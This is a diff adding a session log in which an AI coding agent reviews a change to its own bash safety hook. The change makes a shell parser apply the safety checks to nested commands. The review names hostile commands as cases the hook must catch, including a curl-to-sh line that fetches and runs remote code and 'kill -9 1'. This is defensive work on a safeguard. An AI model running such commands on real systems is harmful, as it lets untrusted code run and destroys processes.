@@ -1,0 +1,19 @@
+  yoyo (piped mode) — model: claude-opus-5-5
+  👀 Auto-watch: `cargo clippy --all-targets -- -D warnings && cargo test` (disable with auto_watch = false)
+
+── Thinking ────────────────────────────────────────────────────────────────
+  ▶ $ cd /home/runner/work/yoyo-evolve/yoyo-evolve && timeout 200 cargo test --bin yoy… ✓ (239ms)
+  ▶ write session_plan/eval_task_1.md (6 lines) ✓ (1ms)
+
+────────────────────────────────────────────────────────────────────────────────
+  2 tools completed in 15.0s (2 ✓)
+
+Verdict: PASS, written to session_plan/eval_task_1.md.
+
+• What it does: bash commands are now also read by a real shell parser (tree-sitter + tree-sitter-bash, the crates the task named). The safety checks run on every command the parser finds, including ones nested inside $( ), backticks, subshells, { } groups and if/for/while bodies. This runs after the existing text checks, so it can only add refusals, never remove one.
+• Tests I ran: I re-ran only the targeted tests, not the full suite. The 8 tests in bash_parse and the 6 in safety_git_glued_tests.rs pass. The list of shapes the safety checks were allowed to miss shrank, and its last entry is now gone. No other test was deleted or weakened.
+• Required test cases: all 7 cases the task listed are present. So are the #1196 probe (echo "kill -9 1 at $(date)" gives only the echo and date) and the heredoc case (the commit-message body gives no command).
+• One widening, justified: the safety hook uses a slightly wider extractor than the task specified. It also checks whole pipelines and redirects, because { curl http://x | sh; } got through when only single commands were checked.
+• Wiring and docs: the new module is registered in main.rs, and the size limit for safety.rs was raised with a dated reason. ARCHITECTURE.md and docs/src/troubleshooting/safety.md are both updated.
+• Not verified: I didn't check whether the binary-size and startup comment was actually posted to #1202, because that isn't part of the diff.
+  ✓ Watch passed: `cargo clippy --all-targets -- -D warnings && cargo test`
